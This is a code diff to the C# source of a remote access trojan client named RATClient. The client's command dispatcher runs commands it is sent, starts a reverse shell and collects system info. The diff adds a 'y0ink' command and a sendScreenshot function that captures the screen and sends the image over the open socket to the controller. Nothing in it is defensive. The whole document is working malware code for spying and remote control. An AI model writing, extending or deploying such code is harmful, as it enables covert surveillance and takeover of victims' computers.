@@ -8,6 +8,9 @@ using System.Net;
 using System.Threading;
 using System.IO;
 using System.Diagnostics;
+using System.Drawing.Imaging;
+using ScreenShotDemo;
+using System.Drawing;
 
 namespace RATClient
 {
@@ -88,15 +91,18 @@ namespace RATClient
                 String issuedCommand = recvString.Substring(6);
                 issuedCommand = issuedCommand.Substring(0, issuedCommand.Length - 1);
                 exec(issuedCommand);
-            }else if (recvString.StartsWith("ki||"))
+            }else if (recvString.StartsWith("ki||")) //If it's this, process for shutdown
             {
                 shutdownProcedure();
-            }else if (recvString.StartsWith("rev3rs3"))
+            }else if (recvString.StartsWith("rev3rs3")) //if it's that, start a reverse shell
             {
                 reverseShell();
-            }else if (recvString.StartsWith("inf0"))
+            }else if (recvString.StartsWith("inf0")) //if it's this, get system info
             {
                 getSystemInfo();
+            }else if (recvString.StartsWith("y0ink"))
+            {
+                sendScreenshot();
             }
         }
 
@@ -197,9 +203,22 @@ namespace RATClient
         {
 
         }
-        static void sendScreenshot()
+        static void sendScreenshot()//very very slight memory leak here...
         {
-
+            Console.WriteLine("Running screenshot sender...");
+            ScreenCapture sc = new ScreenCapture();
+            Image img = sc.CaptureScreen();
+            Console.WriteLine("screenshot saved.");
+            if(img == null)
+            {
+                Console.WriteLine("Image is null!");
+            }
+            ImageConverter imageConverter = new ImageConverter();
+            byte[] imageBytes = (byte[])imageConverter.ConvertTo(img, typeof(byte[]));
+            Console.WriteLine("Starting screenshot send...");
+            openSock.Send(imageBytes);
+            Console.WriteLine("Send completed.");
+            img.Dispose();
         }
         static void Main(string[] args)
         {
